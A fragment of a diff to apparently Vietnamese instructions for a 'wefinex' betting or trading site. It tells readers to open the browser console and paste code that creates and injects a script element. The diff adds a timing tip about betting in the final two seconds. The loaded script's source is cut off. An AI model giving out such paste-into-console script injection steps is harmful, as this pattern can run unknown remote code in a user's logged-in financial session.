@@ -25,6 +25,7 @@ Goto wefinex
 F12/Right Click ->Inspect
 Pase here to console
 
+2s cuoi danh
 
 var fileref=document.createElement('script')
 fileref.setAttribute("type","text/javascript")
